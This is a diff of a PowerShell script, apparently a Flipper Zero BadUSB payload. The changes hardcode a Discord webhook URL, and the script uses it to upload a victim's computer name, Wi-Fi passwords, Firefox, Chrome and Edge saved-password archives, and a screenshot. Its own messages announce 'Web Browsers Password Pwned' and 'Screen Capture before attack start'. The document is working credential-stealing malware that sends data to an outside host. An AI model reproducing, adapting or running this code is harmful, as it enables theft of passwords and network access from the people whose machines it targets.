@@ -1,5 +1,5 @@
 #CHANGE URL TO YOUR URL
-  $hookurl = "$dc" ;
+  $url="https://discord.com/api/webhooks/1153282406497927168/YD2Xc3y6gcbZrqbxL2fuFyjG-empcSebrZFqlD9gj19jcDEUkoTeicqcctzhCVDw8d6z" ;
 #Get PC Name+Date+Time
   $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
 
@@ -109,26 +109,26 @@ $edgepassword = "$env:temp\Edge-Password-$namepc.zip"
 cd $env:temp
 # Send Name Computer to discord
   $Body=@{ content = "**Stats from Flipper-Zero on user:** $env:UserName, on pc: $env:computername"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl   -Method Post -Body ($Body | ConvertTo-Json);
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
 # Upload Stat
-  curl.exe -F "file1=@stats-$namepc.txt" $hookurl ;
+  curl.exe -F "file1=@stats-$namepc.txt" $url;
 # Upload wifi password
-  curl.exe -F "file2=@WIFI-$namepc.txt" $hookurl ;
+  curl.exe -F "file2=@WIFI-$namepc.txt" $url;
 
 # Upload Webbroser Password Pwned
   $Body=@{ content = "**Web Browsers Password Pwned**"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl   -Method Post -Body ($Body | ConvertTo-Json);
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
 # Upload firefox password
-  curl.exe -i -F file=@"$firefoxpassword" $urhookurl l
+  curl.exe -i -F file=@"$firefoxpassword" $url
 # Upload chrome password
-  curl.exe -i -F file=@"$chromepassword" $hookurl 
+  curl.exe -i -F file=@"$chromepassword" $url
 # Upload Edge password
-  curl.exe -i -F file=@"$edgepassword" $hookurl 
+  curl.exe -i -F file=@"$edgepassword" $url
 # Upload screenshot
   sleep 1
   $Body=@{ content = "**Screen Capture before attack start**"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl   -Method Post -Body ($Body | ConvertTo-Json);
-  curl.exe -F "file2=@$screencapture.jpg" $hookurl ;
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
+  curl.exe -F "file2=@$screencapture.jpg" $url;
 
 # Remove Edge clear configuration
   # Kill again and agan Edge after flipper zero get the token
